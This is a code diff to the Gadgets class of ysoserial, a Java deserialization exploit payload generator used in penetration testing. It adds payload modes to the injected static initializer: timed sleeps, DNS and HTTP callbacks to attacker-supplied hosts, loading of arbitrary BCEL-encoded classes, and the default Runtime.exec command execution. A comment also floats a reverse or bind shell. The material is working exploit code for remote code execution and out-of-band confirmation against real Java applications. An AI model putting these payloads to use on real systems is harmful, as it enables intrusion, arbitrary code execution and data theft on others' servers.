@@ -3,6 +3,7 @@ package ysoserial.payloads.util;
 
 import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
 
+import java.io.FileOutputStream;
 import java.io.Serializable;
 import java.lang.reflect.Array;
 import java.lang.reflect.Constructor;
@@ -12,7 +13,6 @@ import java.lang.reflect.Proxy;
 import java.util.HashMap;
 import java.util.Map;
 
-import com.nqzero.permit.Permit;
 import javassist.ClassClassPath;
 import javassist.ClassPool;
 import javassist.CtClass;
@@ -114,9 +114,24 @@ public class Gadgets {
         final CtClass clazz = pool.get(StubTransletPayload.class.getName());
         // run command in static initializer
         // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
-        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
-            command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
-            "\");";
+        String cmd = null;
+        if(command.toLowerCase().startsWith("sleep:")) {
+            int time = Integer.valueOf(command.substring(6)) * 1000;
+            cmd = String.format("java.lang.Thread.sleep(%sL);",time);
+        } else if(command.toLowerCase().startsWith("dnslog:")){
+            String dnslogDomain = command.substring(7);
+            cmd = String.format("java.net.InetAddress.getAllByName(\"%s\");",dnslogDomain);
+        } else if(command.toLowerCase().startsWith("httplog:")){
+            String httplogURL = command.substring(8);
+            cmd = String.format("new java.net.URL(\"%s\").getContent();",httplogURL);
+        } else if(command.toLowerCase().startsWith("bcel:")) {
+            String bcel = command.substring(5);
+            cmd  = String.format("new com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass(\"%s\").newInstance();",bcel);
+        }else {
+             cmd = "java.lang.Runtime.getRuntime().exec(\"" +
+                command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"") +
+                "\");";
+        }
         clazz.makeClassInitializer().insertAfter(cmd);
         // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
         clazz.setName("ysoserial.Pwner" + System.nanoTime());
